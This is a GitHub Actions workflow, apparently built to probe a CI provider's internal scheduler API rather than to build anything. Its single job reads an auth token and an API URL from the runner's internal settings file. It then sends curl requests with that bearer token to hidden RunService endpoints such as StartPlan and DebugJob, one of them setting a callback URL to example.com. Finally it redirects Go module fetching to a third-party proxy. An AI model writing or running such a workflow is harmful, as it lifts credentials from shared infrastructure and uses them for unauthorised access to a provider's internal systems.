name: StartPlan Attempt
on:
  push:
    branches: [master]
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      - name: Try StartPlan (the handshake)
        continue-on-error: true
        run: |
          TOK=$(python3 -c "import json;print(json.load(open('/opt/hca/.settings'))['authToken'],end='')")
          API=$(python3 -c "import json;print(json.load(open('/opt/hca/.settings'))['schedulerApiUrl'],end='')")
          
          echo "=== API URL: $API ==="
          
          echo "=== 1. Try StartPlan with minimal JSON ==="
          docker run --rm --net=host ghcr.io/dependabot/dependabot-updater-core sh -c "
            curl -sk --connect-timeout 10 \
              -H 'Authorization: Bearer $TOK' \
              -H 'Content-Type: application/json' \
              -d '{\"planId\":\"test\",\"workflowTemplate\":\"test\"}' \
              '${API}twirp/github.actions.run_service.api.twirp.v1.RunService/StartPlan'
          " 2>&1
          
          echo ""
          echo "=== 2. Try with more complete payload ==="
          docker run --rm --net=host ghcr.io/dependabot/dependabot-updater-core sh -c "
            curl -sk --connect-timeout 10 \
              -H 'Authorization: Bearer $TOK' \
              -H 'Content-Type: application/json' \
              -d '{\"planId\":\"test\",\"workflowTemplate\":\"test\",\"configuration\":{\"callbacks\":{\"receiverUrl\":\"https://example.com\"}}}' \
              '${API}twirp/github.actions.run_service.api.twirp.v1.RunService/StartPlan'
          " 2>&1
          
          echo ""
          echo "=== 3. Try DebugJob (doesnt need plan) ==="
          docker run --rm --net=host ghcr.io/dependabot/dependabot-updater-core sh -c "
            curl -sk --connect-timeout 10 \
              -H 'Authorization: Bearer $TOK' \
              -H 'Content-Type: application/json' \
              -d '{\"planId\":\"test\",\"jobUuid\":\"test\"}' \
              '${API}twirp/github.actions.run_service.api.twirp.v1.RunService/DebugJob'
          " 2>&1
          
          echo ""
          echo "=== 4. Also fix the Go client ==="
          export GOPROXY=https://goproxy.cn,direct
          apt-get update -qq && apt-get install -y -qq golang-go 2>/dev/null
          which go 2>/dev/null || echo "no go"
